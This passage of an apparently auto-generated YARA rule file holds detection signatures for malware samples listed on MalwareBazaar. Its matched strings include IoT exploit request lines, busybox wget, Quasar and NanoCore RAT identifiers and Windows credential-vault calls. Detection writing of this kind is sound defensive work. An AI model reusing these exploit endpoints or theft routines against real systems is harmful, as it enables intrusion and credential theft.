        $s18 = "GetTypeFromHandle"
        $s19 = "CreateInstance"
        $s20 = "ThreadStaticAttribute"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 93KB and
        all of them
}

rule Windows_158900b745c256a090351228530873b4d3835d79a148927de1415db6965d23dd
{
    meta:
        description = "Auto ML: 158900b745c256a090351228530873b4d3835d79a148927de1415db6965d23dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_azFZ"
        $s6 = "System.Collections.Generic"
        $s7 = "Load"
        $s8 = "set_FormattingEnabled"
        $s9 = "set_Handled"
        $s10 = "get_Elapsed"
        $s11 = "set_AutoScaleMode"
        $s12 = "GetTypeFromHandle"
        $s13 = "set_Name"
        $s14 = "GetType"
        $s15 = "get_Culture"
        $s16 = "set_Culture"
        $s17 = "ApplicationSettingsBase"
        $s18 = "STAThreadAttribute"
        $s19 = "DebuggerNonUserCodeAttribute"
        $s20 = "TargetFrameworkAttribute"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 639KB and
        all of them
}

rule Linux_df630714b75ea32ed26efb7693d0d56e3827401dc2482457a40b73719c51c69d
{
    meta:
        description = "Auto ML: df630714b75ea32ed26efb7693d0d56e3827401dc2482457a40b73719c51c69d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "shell"
        $s12 = "httpd"
        $s13 = "system"
        $s14 = "wget-log"
        $s15 = "1337SoraLOADER"
        $s16 = "nloads"
        $s17 = "elfLoad"
        $s18 = "/usr/libexec/openssh/sftp-server"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 158KB and
        all of them
}

rule Windows_df74b92aec13912e659a4f5fe8d9b7613806d49bf0ebfa8bd4e42cb957d3f65f
{
    meta:
        description = "Auto ML: df74b92aec13912e659a4f5fe8d9b7613806d49bf0ebfa8bd4e42cb957d3f65f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Cannot read Table of Contents."
        $s7 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s9 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s10 = "Failed to extract %s: failed to read data chunk!"
        $s11 = "fread"
        $s12 = "Failed to extract %s: failed to write data chunk!"
        $s13 = "fwrite"
        $s14 = "Failed to extract %s: failed to open archive file!"
        $s15 = "Failed to extract %s: failed to open target file!"
        $s16 = "fopen"
        $s17 = "Failed to read cookie!"
        $s18 = "Could not read full TOC!"
        $s19 = "Error on file."
        $s20 = "Failed to open archive %s!"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15459KB and
        all of them
}

rule Windows_df7b3f70371116dcbde25dd117254de513f9abe9ca80559498c38cfa04b6503f
{
    meta:
        description = "Auto ML: df7b3f70371116dcbde25dd117254de513f9abe9ca80559498c38cfa04b6503f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4598KB and
        all of them
}

rule Windows_df95e225feeb2e8547d53ac6760e13c8ce7a9a0858e71df3a4509663285f7cd3
{
    meta:
        description = "Auto ML: df95e225feeb2e8547d53ac6760e13c8ce7a9a0858e71df3a4509663285f7cd3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "DbSet`1"
        $s5 = "HashSet`1"
        $s6 = "QLChiTieuDataSet1"
        $s7 = "qLChiTieuDataSet1"
        $s8 = "<Module>"
        $s9 = "get_IdGD"
        $s10 = "set_IdGD"
        $s11 = "get_LoaiGD"
        $s12 = "set_LoaiGD"
        $s13 = "get_IdLoaiGD"
        $s14 = "set_IdLoaiGD"
        $s15 = "get_NgayGD"
        $s16 = "set_NgayGD"
        $s17 = "System.IO"
        $s18 = "get_MoTa"
        $s19 = "set_MoTa"
        $s20 = "System.Xml.Schema"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 932KB and
        all of them
}

rule Windows_dfc2549bb01c896ce859ef5b081d26128ea36cf31321450ec9c3b89f6fbcd620
{
    meta:
        description = "Auto ML: dfc2549bb01c896ce859ef5b081d26128ea36cf31321450ec9c3b89f6fbcd620"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "$Failed to get the key parameter. {0}"
        $s6 = "$Failed to set the key parameter. {0}"
        $s7 = "0Authorization Context with id= '{0}' is created."
        $s8 = "Cannot read KeyIdentifierClause from element '{0}' with namespace '{1}'.  Custom KeyIdentifierClauses require custom SecurityTokenSerializers, please refer to the SDK for examples."
        $s9 = "|The algorithm '{0}' was used with Federal Information Processing Standards (FIPS) mode enabled, but is not FIPS compatible."
        $s10 = "VLogonUser failed for the '{0}' user. Ensure that the user has a valid Windows account."
        $s11 = "tFailed to delete key container file and it will be left in the file system.  Please see inner exception for details."
        $s12 = "Found multiple X.509 certificates using the following search criteria: StoreName '{0}', StoreLocation '{1}', FindType '{2}', FindValue '{3}'.  Provide a more specific find value."
        $s13 = "AID0012: Failed to create an instance of '{0}' from configuration."
        $s14 = "ID1039: The certificate's private key could not be accessed. Ensure the access control list (ACL) on the certificate's private key grants access to the application pool user."
        $s15 = "ID1053: The ClaimsIdentity contained multiple UPN Claims. The automatic Windows identity mapping feature does not support this scenario."
        $s16 = "ID1054: The ClaimsIdentity did not contain a valid UPN Claim. The automatic Windows identity mapping feature requires exactly one non-empty UPN Claim to be provided."
        $s17 = "ID2013: SecurityTokenService.GetScope returned null. Return a suitable Scope instance from SecurityTokenService.GetScope to issue a token."
        $s18 = "ID2050: When the KeyType is bearer, it is not valid to have a KeySize element with a value other than zero in the request. To fix this, change the key type or set the key size to zero."
        $s19 = "uID2052: The RequestType, if specified, must be set to Issue. The SecurityTokenService can only handle Issue requests."
        $s20 = "ID2072: The RequestSecurityToken contains an element with name '{0}' that cannot be processed. You will need to provide a custom WSTrustRequestSerializer to process this element."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 825KB and
        all of them
}

rule Windows_dfebde9ad6b1591c0044fcfbf6336cb9a9088409179055e4d438cd95b4d7bda0
{
    meta:
        description = "Auto ML: dfebde9ad6b1591c0044fcfbf6336cb9a9088409179055e4d438cd95b4d7bda0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rsrc"
        $s3 = "Setngs.:10L"
        $s4 = "TThread"
        $s5 = "TModuleInf"
        $s6 = "HTTP@"
        $s7 = "ARSETFTF-8"
        $s8 = "TEmptyp"
        $s9 = "TTemp5Q"
        $s10 = "ILoad"
        $s11 = "1DiverseOpened"
        $s12 = "]InvokeRegistry"
        $s13 = "HTTPUtil"
        $s14 = "SOAPHTTPTrans"
        $s15 = "KWindows"
        $s16 = "System"
        $s17 = "YSOAPHTTPClient"
        $s18 = "?HTTPApp"
        $s19 = "?WinInet"
        $s20 = "WinSock"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1426KB and
        all of them
}

rule Linux_e00fdd6b753f80a4688051fe0cb15ffdba32e0b6b2b5a964df823dddedb88fd2
{
    meta:
        description = "Auto ML: e00fdd6b753f80a4688051fe0cb15ffdba32e0b6b2b5a964df823dddedb88fd2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 110KB and
        all of them
}

rule Linux_e025be16dfc6029be596ed64e16f43170346ec2a25c98310a22106b324dee0e4
{
    meta:
        description = "Auto ML: e025be16dfc6029be596ed64e16f43170346ec2a25c98310a22106b324dee0e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "UPX!0"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 5KB and
        all of them
}

rule Windows_e065974b0db0079fcc57cf5d209fa267c852772a58a68cee307a72c91d382a8e
{
    meta:
        description = "Auto ML: e065974b0db0079fcc57cf5d209fa267c852772a58a68cee307a72c91d382a8e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System.Runtime.InteropServices"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.CompilerServices"
        $s9 = "System.Core"
        $s10 = "<Module>"
        $s11 = "System.IO"
        $s12 = "WWXt53e0qqseTBQoF37"
        $s13 = "<Module>{94B7E62C-AB4C-43AF-9CAE-D400C891F0FB}"
        $s14 = "<Module>{853ebf73-68a8-4c38-8ab1-ce3519eee025}"
        $s15 = "QR5cMdmJf1DH7aSWLoh2"
        $s16 = "eLEewCmd5En6Z1SjO84b"
        $s17 = "VA9HmCmdyVOe6WICg926"
        $s18 = "KiDvywmSEtQwmTwdctn0"
        $s19 = "FlWinWmwTb9AgxfUW07s"
        $s20 = "System.Text"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3792KB and
        all of them
}

rule Windows_e0b37708bdad729d029e1992be9559e65e957b756185e7ed783369add1a6ea6c
{
    meta:
        description = "Auto ML: e0b37708bdad729d029e1992be9559e65e957b756185e7ed783369add1a6ea6c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Cannot read Table of Contents."
        $s7 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s9 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s10 = "Failed to extract %s: failed to read data chunk!"
        $s11 = "fread"
        $s12 = "Failed to extract %s: failed to write data chunk!"
        $s13 = "fwrite"
        $s14 = "Failed to extract %s: failed to open archive file!"
        $s15 = "Failed to extract %s: failed to open target file!"
        $s16 = "fopen"
        $s17 = "Failed to read cookie!"
        $s18 = "Could not read full TOC!"
        $s19 = "Error on file."
        $s20 = "Error opening archive %s"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 13281KB and
        all of them
}

rule Windows_15931de8e192e8932d881c6d450d52090f92f9b5e9f0f0b903cc5ec033b58b54
{
    meta:
        description = "Auto ML: 15931de8e192e8932d881c6d450d52090f92f9b5e9f0f0b903cc5ec033b58b54"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3189KB and
        all of them
}

rule Windows_e0ba5aa714833106f411e75729d0a77044778dc55858e3a3701d9a4966c380e1
{
    meta:
        description = "Auto ML: e0ba5aa714833106f411e75729d0a77044778dc55858e3a3701d9a4966c380e1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4755KB and
        all of them
}

rule Windows_e0d805f837db16902f58d0421831b2a8ee491d67b24c447ff8bcbb15784fae3c
{
    meta:
        description = "Auto ML: e0d805f837db16902f58d0421831b2a8ee491d67b24c447ff8bcbb15784fae3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.reloc"
        $s3 = "B.rsrc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "NanoCore Client.exe"
        $s6 = "System.Windows.Forms"
        $s7 = "System"
        $s8 = "System.Drawing"
        $s9 = "kernel32.dll"
        $s10 = "psapi.dll"
        $s11 = "advapi32.dll"
        $s12 = "ntdll.dll"
        $s13 = "dnsapi.dll"
        $s14 = "ClientLoaderForm.resources"
        $s15 = "User"
        $s16 = "Microsoft.VisualBasic.CompilerServices"
        $s17 = "StandardModuleAttribute"
        $s18 = "HideModuleNameAttribute"
        $s19 = "Registry"
        $s20 = "Microsoft.Win32"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 243KB and
        all of them
}

rule Windows_e1179516c0fe8cbf69566d5db63c6d1d7d02d67b04eae5800f9a950fb07fee81
{
    meta:
        description = "Auto ML: e1179516c0fe8cbf69566d5db63c6d1d7d02d67b04eae5800f9a950fb07fee81"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "app.alpha.GetVaarHeaders"
        $s7 = "Activity History Temp Files"
        $s8 = "avcfg://settings/Common/SoftTrialLastOffer"
        $s9 = "RegKey28=HKCU\\\\Software\\\\PowerArchiverInt\\\\Files|Extract10W"
        $s10 = "avcfg://settings/SecureLine/FreeLimitRenewedToasterDisplayTime"
        $s11 = "DLMDnsSvc.exe"
        $s12 = "GetTimeFormatEx"
        $s13 = "ecdsa_sign_setup"
        $s14 = "getState"
        $s15 = "FileKey4=%CommonAppData%\\\\Avira\\\\SystemSpeedup\\\\Errors|*.*"
        $s16 = "RowSetAdd"
        $s17 = "PNG read error"
        $s18 = "HTTP server doesn't seem to support byte ranges. Cannot resume."
        $s19 = "read-only file system"
        $s20 = "file_ctrl"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 508KB and
        all of them
}

rule Windows_e13f7cea04b3dacdca15e10bdee19e52b0f0bee02ed6a32971d92d1089ff49e5
{
    meta:
        description = "Auto ML: e13f7cea04b3dacdca15e10bdee19e52b0f0bee02ed6a32971d92d1089ff49e5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "7 EcmD"
        $s7 = "CWinThread"
        $s8 = "CreateActCtxW"
        $s9 = "GetModuleHandleExW"
        $s10 = "Kernel32.dll"
        $s11 = "Comctl32.dll"
        $s12 = "ImageList_GetIconSize"
        $s13 = "CMFCVisualManagerWindows"
        $s14 = "CWinApp"
        $s15 = "RegOpenKeyTransactedW"
        $s16 = "RegCreateKeyTransactedW"
        $s17 = "RegDeleteKeyTransactedW"
        $s18 = "CCmdTarget"
        $s19 = "SetDefaultDllDirectories"
        $s20 = "RegisterTouchWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3672KB and
        all of them
}

rule Windows_e199b649f562ee61d10b1f77a77fef2a3bf0c1f870e4aa9958402a4059f2fa1c
{
    meta:
        description = "Auto ML: e199b649f562ee61d10b1f77a77fef2a3bf0c1f870e4aa9958402a4059f2fa1c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "System"
        $s6 = "kernel32.dll"
        $s7 = "GetLongPathNameA"
        $s8 = "TFileName"
        $s9 = "EWin32ErrorL"
        $s10 = "TActiveThreadArray"
        $s11 = "$TMultiReadExclusiveWriteSynchronizer"
        $s12 = "GetDiskFreeSpaceExA"
        $s13 = "bdRightToLeftReadingOnly"
        $s14 = "EFCreateError"
        $s15 = "EFOpenErrorP"
        $s16 = "EFilerError"
        $s17 = "EReadError"
        $s18 = "EWriteErrorX"
        $s19 = "TThreadList"
        $s20 = "TFileStreamt"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 2547KB and
        all of them
}

rule Windows_e1a098790e575bfbdde1957b2287912df823590042759fdf8e5e2adc26857137
{
    meta:
        description = "Auto ML: e1a098790e575bfbdde1957b2287912df823590042759fdf8e5e2adc26857137"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Drawing.Drawing2D"
        $s6 = "GetLI"
        $s7 = "System.IO"
        $s8 = "System.Collections.Generic"
        $s9 = "get_CanRead"
        $s10 = "buttonLoad"
        $s11 = "get_windSpeed"
        $s12 = "set_Enabled"
        $s13 = "set_FormattingEnabled"
        $s14 = "<windSpeed>k__BackingField"
        $s15 = "<temperature>k__BackingField"
        $s16 = "<windDirection>k__BackingField"
        $s17 = "set_AutoScaleMode"
        $s18 = "FileMode"
        $s19 = "set_SizeMode"
        $s20 = "get_Image"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 561KB and
        all of them
}

rule Windows_e1da3baddbcf9c26f51c48c828a7fac1f621d885860c7166529ffe64d2b149be
{
    meta:
        description = "Auto ML: e1da3baddbcf9c26f51c48c828a7fac1f621d885860c7166529ffe64d2b149be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "wypZZcm8aznAEEiTs5mFcxMfDw3ULeSQsIsut67SDtIwY0gwWINIW4dgSGUobGdzF8prcU93w88PtRBW0KgrvexJknO1"
        $s5 = "ThreadSafeObjectProvider`1"
        $s6 = "Microsoft.Win32"
        $s7 = "<Module>"
        $s8 = "capGetDriverDescriptionA"
        $s9 = "capCreateCaptureWindowA"
        $s10 = "ES_SYSTEM_REQUIRED"
        $s11 = "get_ASCII"
        $s12 = "cp7MbblqgWZg49fr1sF09sQ5NG7Y8KvLHRzNseTUdxNIAR78jIcdlmTwVOs8WGIjGwdvsRXpQj5FO"
        $s13 = "System.IO"
        $s14 = "Create__Instance__"
        $s15 = "System.Collections.Generic"
        $s16 = "Thread"
        $s17 = "Load"
        $s18 = "get_Elapsed"
        $s19 = "RegistryValueKind"
        $s20 = "set_Method"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 66KB and
        all of them
}

rule Windows_e20841eb14d1bfb4c03ec93b7d41e21136fb172ae4d3129941ae40c73abaafa2
{
    meta:
        description = "Auto ML: e20841eb14d1bfb4c03ec93b7d41e21136fb172ae4d3129941ae40c73abaafa2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "h.reloc"
        $s5 = "@.rsrc"
        $s6 = "CreateProcessAsUserW"
        $s7 = "SetWindowPos"
        $s8 = "GetModuleFileNameW"
        $s9 = "DefWindowProcA"
        $s10 = "FileTimeToSystemTime"
        $s11 = "ShowWindow"
        $s12 = "ImmSetCompositionWindow"
        $s13 = "GetDriveTypeW"
        $s14 = "GetFullPathNameW"
        $s15 = "GetEnvironmentVariableA"
        $s16 = "GetCapture"
        $s17 = "LoadLibraryW"
        $s18 = "CreateWindowExW"
        $s19 = "GetFileInformationByHandle"
        $s20 = "GetFileSizeEx"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8323KB and
        all of them
}

rule Windows_e21cbcbb1005efb933b99b1e09a12c333b1fadc391ebde3e1261b83559082455
{
    meta:
        description = "Auto ML: e21cbcbb1005efb933b99b1e09a12c333b1fadc391ebde3e1261b83559082455"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Unable to resolve HTTP prox"
        $s5 = "get_Item1"
        $s6 = "kernel32"
        $s7 = "Microsoft.Win32"
        $s8 = "user32"
        $s9 = "ReadInt32"
        $s10 = "get_Item2"
        $s11 = "get_Item3"
        $s12 = "ReadInt64"
        $s13 = "ReadInt16"
        $s14 = "VaultGetItem_WIN7"
        $s15 = "VaultGetItem_WIN8"
        $s16 = "<Module>"
        $s17 = "FileHandleID"
        $s18 = "fileHandleID"
        $s19 = "lpdwProcessID"
        $s20 = "processID"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 235KB and
        all of them
}

rule Windows_e240139a207773b24047ce352998870ba5db138ddeee2f03983e2e0b95ba7cdb
{
    meta:
        description = "Auto ML: e240139a207773b24047ce352998870ba5db138ddeee2f03983e2e0b95ba7cdb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<FrmMain_Load>b__2_0"
        $s5 = "<FrmMain_Load>b__2_1"
        $s6 = "<FrmMain_Load>b__2_2"
        $s7 = "<Module>"
        $s8 = "get_BoPS"
        $s9 = "set_SpeedX"
        $s10 = "System.Collections.Generic"
        $s11 = "Read"
        $s12 = "Thread"
        $s13 = "add_Load"
        $s14 = "FrmMain_Load"
        $s15 = "get_OrangeRed"
        $s16 = "get_Speed"
        $s17 = "set_Speed"
        $s18 = "get_Enabled"
        $s19 = "set_Enabled"
        $s20 = "set_DoubleBuffered"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 637KB and
        all of them
}

rule Windows_15b386a6b3114004205aec7e70b00065aa7f847ca3de172cb3d0e0566a91ce20
{
    meta:
        description = "Auto ML: 15b386a6b3114004205aec7e70b00065aa7f847ca3de172cb3d0e0566a91ce20"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Core"
        $s13 = "System.Security"
        $s14 = "SecurityRuleSet"
        $s15 = "production_according_to_schedules_based_on_data.exe"
        $s16 = "<Module>"
        $s17 = "ThreadSafeObjectProvider`1"
        $s18 = "MySettings"
        $s19 = "ApplicationSettingsBase"
        $s20 = "System.Configuration"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5502KB and
        all of them
}

rule Linux_e24e13274eb611c22cbf4f339e8f80a346e3f6e9435a6f212b6a53254bed47fd
{
    meta:
        description = "Auto ML: e24e13274eb611c22cbf4f339e8f80a346e3f6e9435a6f212b6a53254bed47fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1."
        $s2 = "User-"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 53KB and
        all of them
}

rule Windows_e24f84235d063a70edbd6965a5e3639368e87a6ab7cccd661e49c07a0439d0bd
{
    meta:
